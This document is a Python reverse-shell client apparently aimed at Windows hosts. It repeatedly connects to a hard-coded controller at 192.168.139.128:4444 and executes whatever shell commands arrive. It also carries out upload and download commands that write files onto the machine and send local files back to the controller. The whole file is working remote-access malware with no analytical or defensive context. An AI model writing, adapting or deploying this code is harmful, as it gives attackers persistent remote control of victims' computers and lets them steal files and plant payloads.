import socket
import subprocess
import os
import sys
import time

def handle_commands(patil):
    """Handle commands received from the server."""
    os.chdir('C:/')
    current_dir = os.getcwd()

    try:
        while True:
            try:
                receive = patil.recv(1024).decode()
                if not receive:
                    print("Server disconnected.")
                    break
                if receive == "exit":
                    break
                elif receive.startswith("cd "):
                    try:
                        new_dir = receive[3:].strip()
                        os.chdir(new_dir)
                        current_dir = os.getcwd()
                        output = f"Changed directory to {current_dir}"
                    except Exception as e:
                        output = str(e)
                    patil.send(output.encode())
                elif receive.startswith("upload "):
                    filename = receive.split(" ", 1)[1]
                    with open(filename, "wb") as f:
                        while True:
                            file_data = patil.recv(1024)
                            if file_data.endswith(b"DONE"):
                                f.write(file_data[:-4])
                                break
                            f.write(file_data)
                    patil.send(b"Upload complete")
                elif receive.startswith("download "):
                    filename = receive.split(" ", 1)[1]
                    try:
                        with open(filename, "rb") as f:
                            file_data = f.read()
                        patil.sendall(file_data)
                        patil.send(b"DONE")
                    except FileNotFoundError:
                        patil.send(b"ERROR")
                else:
                    try:
                        output = subprocess.check_output(receive, shell=True, stderr=subprocess.STDOUT, cwd=current_dir).decode()
                    except subprocess.CalledProcessError as e:
                        output = e.output.decode()
                    patil.send(output.encode())
            except Exception as e:
                print(f"An error occurred: {e}")
                break
    except KeyboardInterrupt:
        print("Client interrupted and closing...")
    finally:
        patil.close()

def main():
    host = "192.168.139.128"
    port = 4444

    while True:
        try:
            # Create a socket object for IPv4 and TCP
            patil = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            print("Attempting to connect...")

            # Attempt to connect to the server
            while True:
                try:
                    patil.connect((host, port))
                    print("Connected to the server")
                    break
                except ConnectionRefusedError:
                    print("Server refused connection, retrying...")
                    time.sleep(5)  # Retry after 5 seconds

            handle_commands(patil)
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            patil.close()
            print("Reconnecting in 5 seconds...")
            time.sleep(5)  # Wait before retrying to reconnect

if __name__ == "__main__":
    main()
